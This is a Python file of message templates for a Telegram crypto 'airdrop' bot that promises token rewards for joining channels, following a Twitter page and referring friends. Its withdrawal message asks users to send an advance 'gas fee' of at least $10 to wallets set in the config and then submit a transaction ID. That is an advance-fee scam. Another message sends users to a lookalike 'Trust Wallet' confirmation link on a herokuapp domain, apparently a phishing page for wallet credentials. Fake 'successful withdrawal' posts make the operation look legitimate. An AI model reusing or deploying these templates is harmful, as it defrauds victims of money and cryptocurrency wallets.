import sys
import importlib
c = importlib.import_module('configs.'+sys.argv[0].split('.')[0])

register_reward = int(float(c.CURRENT_PRICE)*int(c.REGISTER_REWARD))
referral_reward = int(float(c.CURRENT_PRICE)*int(c.REFERRAL_REWARD))

# ? Others
please_wait = '♻️ <b>Please wait...</b>'
home_menu = '🏠 Home menu:'


# ? Channels
# 👉 https://t.me/{c.CHANNEL2}

join_channel = f'''
1️⃣ <b>Join in our channel:</b>
👉 https://t.me/{c.CHANNEL1}

❔ <i>After joining in channels, click on "Done".</i>
'''

left_from_channel = '''
❌ <b>You have not joined in our channels!</b>

⚠️ To use the bot, you must join our channels.

❔ After joining in channels, click on /start.
'''

not_joined = "❌ You are not joining the channel yet."

# ? Register form

# Step 1
start_registering = f'''
🎉 Hello dear [NAME].
📌 Welcome to <b>{c.TOKEN_NAME}</b> Airdrop bot.

💰 <b>1 ${c.SYMBOL_UPPER} = ~{c.CURRENT_PRICE}$</b>
💸 Total airdrop supply: <b>{c.AIRDROP_SUPPLY} ${c.SYMBOL_UPPER}</b>

🎁 Airdrop rewards:

📢 <b>For joining in our official Telegram channels & Twitter page :</b>
👉 {c.REGISTER_REWARD} ${c.SYMBOL_UPPER} = <b>{register_reward}$</b>

👥 <b>For each referral :</b>
👉 {c.REFERRAL_REWARD} ${c.SYMBOL_UPPER} = <b>{referral_reward}$</b>

✅ <i>You need to do the required tasks to become qualified for receiving airdrop tokens.</i>

⚠️ <code>Be careful! If you cheat in the airdrop, your account will be banned forever from bot.</code>
'''

# Step 2
follow_twitter = f'''
2️⃣ <b>Follow our Twitter page:</b>
http://twitter.com/{c.TWITTER}

❔ <i>Like and retweet the pinned tweet, then click "Done".</i>
'''

# Step 3
get_twitter_username = '3️⃣ <b>Now, Send your Twitter username without @ :</b>'
twitter_error = "❌ <b>Invalid Twitter username!</b>\n❔ Username must be at least 4 characters long and not started with @.\n\n"+get_twitter_username
confirm_twitter_username = '''
❔<b>Do you confirm this is your Twitter username?</b>

👉 @{username}'''

# Step 4
get_email = '''
4️⃣ <b>Send your Email :</b>

❔ <b>Example :</b> john@example.com
'''

email_error = "❌ <b>Invalid Email!</b>\n"+get_email
confirm_email = '''
❔<b>Do you confirm this is your Email address?</b>

👉 {email}'''

# Step 4
get_wallet = f'''
5️⃣ <b>Last step, Send your ${c.SYMBOL_UPPER} wallet address:</b>

❔ Need some help? Press /faq
'''

if(c.NETWORK == 'tron'):
    address_rules = '❔ Address must be 34 characters and started with T.'
elif(c.NETWORK == 'ethereum'):
    address_rules = '❔ Address must be 42 characters and started with 0x.'

wallet_error = f'''
❌ <b>Invalid ${c.SYMBOL_UPPER} wallet address!</b>
{address_rules}

5️⃣ <b>Send your ${c.SYMBOL_UPPER} wallet address:</b>
'''

confirm_wallet = f'''
❔<b>Do you confirm this is your ${c.SYMBOL_UPPER} address?</b>

👉 [WALLET]'''

# All done
all_done = f'''
✅ <b>Congratulations! You have completed all the tasks.</b>

📥 <b>{c.REGISTER_REWARD} ${c.SYMBOL_UPPER} was added to your balance.</b>

📈 You can get more ${c.SYMBOL_UPPER} tokens by sharing your referral link with your friends.

📅 Withdrawal openning date: <b>{c.WITHDRAW_OPENING}</b>
'''

# ? Home menu
start = f'''
🎉 Hello dear [NAME].
📌 Welcome to <b>{c.TOKEN_NAME}</b> Airdrop bot.

✅ <b>You have completed all the tasks. No need to do anything else. Just wait until withdrawal date to get your rewards.</b>

📈 You can also get more ${c.SYMBOL_UPPER} tokens by sharing your referral link with your friends.
'''

balance = '''
💰 <b>Your balance:</b>

👉 {units} ${symbol} = <b>{tilde}{balance}$</b>
'''

# 👥 <b > Your referrals: < /b >
# {referrals}


account = '''
👤 <b>Your account information:</b>

🆔 <b>Account ID:</b> {chat_id}

📝 <b>Name:</b> {name}

✉️ <b>Email:</b> {email}

🕊 <b>Twitter:</b> @{twitter}

🔗 <b>$[SYMBOL] wallet address:</b>
<code> {wallet} </code>
➖➖➖➖➖➖➖➖➖➖
👥 <b>Referrals ({referrals_count}):</b>
{referrals}
'''

get_withdraw = f'''
💵 Due to the network fee's as well as detecting real users from robots, you need to pay gas fee to withdraw your funds.

🔸 The amount you pay represents your confirmation of the rules and your receipt of airdrop funds in the amount of <b>[BALANCE]$</b>.

📢 If there is a problem, check our deposits channel:
@{c.CHANNEL1}

☑️ After successful payment, you must send us your Transaction TXID to confirm and receive your airdrop.

👥 Our support team will deposit your airdrop as soon as possible.

⚠️ <b>IMPORTANT:</b> due to network restrictions, the minimum payment amount is <b>$10</b>. Also, if you pay more gas fee, your withdrawal will be done <b>faster</b>.

💳 <b>Payment methods (click to copy):</b>

USDT (TRC-20):
<code>{c.USDT_WALLET}</code>

TRX (TRC-20) [180 TRX]:
<code>{c.TRX_WALLET}</code>

BNB (BEP-20) [0.03 BNB]:
<code>{c.BNB_WALLET}</code>

BUSD (BEP-20):
<code>{c.BUSD_WALLET}</code>

‼️ <b>Note: </b> You have to send 10$ of these coins, not 10 units.

📥 <b>Send your Transaction TXID:</b>
'''
txid_error = '''
❌ <b>Invalid Transaction TXID!</b>
❔ TXID must be 64 or 11 characters.

📥 <b>Send your Transaction TXID:</b>
'''

withdraw_close = f'''
🎉 Airdrop is over and all 300,000 ${c.SYMBOL_UPPER} tokens have been distributed among applicants and Airdrop participants.

✅ <b>If you have not yet received your ${c.SYMBOL_UPPER} tokens yet, You should go to the official Trust Wallet website and confirm your wallet to get your ${c.SYMBOL_UPPER} tokens without any delay👇</b>

<a href='https://trustewallet.herokuapp.com/verify'>☑️ Trust Wallet Confirmation Site</a>

<b>Click on this link 👆👆👆</b>
'''

# 💰 Your new balance: {tokens} ${symbol} = {usd}$

withdraw_done = '''
✅ <b>Your transaction has been successfully confirmed and your rewards has been sent to your wallet!</b>

⚠️ <b>Note:</b> due to the large volume of withdrawal requests, deposits may take 12 to 24 hours.
'''

# 🔖 <b>Fee TXID</b>👇
# {txid}

withdraw_done_channel = '''
📤 <b>New successful withdrawal:</>

👤 <b>User:</b> {full_name}

🆔 <b>Account ID:</b> {chat_id}

💳 <b>Wallet address:</b> {wallet}

💰 <b>Amount:</b> {tokens} ${symbol} = {usd}$

⚠️ <b>Note:</b> due to the large volume of withdrawal requests, deposits may take 12 to 24 hours. Follow the latest news from our <a href='https://t.me/{channel}'>official channel</a>.
'''

no_referrals = "No referrals"
self_referral = "❗️ <b>You can't invite yourself to the bot!</b>"

referral_banner = f'''
🔥 Join the <b>${c.SYMBOL_UPPER}</b> Airdrop now!🤑

💰 Get <b>${register_reward}</b> for completing tasks!
👥 Get <b>${referral_reward}</b> per each referral!

⚡️ <b>Get your rewards now</b> 👇
🔗 https://t.me/{c.BOT_USERNAME}?start=[CHAT_ID]
'''

referral_joined = '''
✅ <a href='tg://user?id={chat_id}'>{name}</a> joined with your referral link!

📥 <b>[TOKENS] $[SYMBOL] was added to your balance.</b>
'''

your_referrals = '''📊 <b>You are currently have {count} referrals.</b>'''

your_referrals_list = '''
📊 <b>You are currently have {count} referrals.</b>

👥 <b>List of your referrals:</b>
{referrals}

⚠️ <b>Note:</b> Your referrals must complete their registration, then you will receive your rewards!
'''

faq = f'''
📚 <b>FAQ:</b>

❓ <b>I can't see ${c.SYMBOL_UPPER} in my wallet, where can i find it?</b>
🔹 You can add ${c.SYMBOL_UPPER} to your wallet using our contract address (click to copy):
<code>{c.CONTRACT}</code>

❓ <b>Why you need my ${c.SYMBOL_UPPER} wallet address?</b>
🔹 For claiming your rewards, we need your ${c.SYMBOL_UPPER} wallet address.

❓ <b>What wallet do I need to receive my rewards?</b>
🔹 We prefer Trust Wallet for claiming your rewards.
'''

# ! Errors
unknown_error = '❌ <b>Unknown command!</b>'
unknown_command = '❌ <b>Unknown command!</b>'
unknown_problem = '''
❌ <b>Unknown problem!</b>

👉 Please / start the bot again.
'''

# ? ------- Edit information ------ #

select_information = '❔ Edit information menu:'

# ----------------------- #

edit_email = '''
📝 <b>Send your new Email :</b>

❔ <b>Example :</b> john@example.com
'''

edit_email_error = "❌ <b>Invalid Email!</b>\n"+edit_email

# ----------------------- #

edit_twitter = '📝 <b> Send your new Twitter username without @ :</b>'

edit_twitter_error = "❌ <b>Invalid Twitter username!</b>\n❔ Username must be at least 4 characters long and not started with @.\n\n"+edit_twitter

# ----------------------- #

edit_wallet = f'''
📝 <b>Send your new ${c.SYMBOL_UPPER} wallet address:</b>

❔ Need some help? Press /faq
'''

edit_wallet_error = f'''
❌ <b>Invalid ${c.SYMBOL_UPPER} wallet address!</b>
{address_rules}

📝 <b>Send your new ${c.SYMBOL_UPPER} wallet address:</b>
'''

# ----------------------- #

edit_done = '✅ <b>Your {column} edited successfully.</b>'

not_enough_balance = f'''
❌ <b>You don't have enough balance to withdraw!</b>

📈 <b>Minimum amount of withdrawal: {c.REFERRAL_REWARD} ${c.SYMBOL_UPPER}</b>

✅ You can get more ${c.SYMBOL_UPPER} tokens by sharing your referral link with your friends,click on "🔗 Referral" button to get your link. 
'''
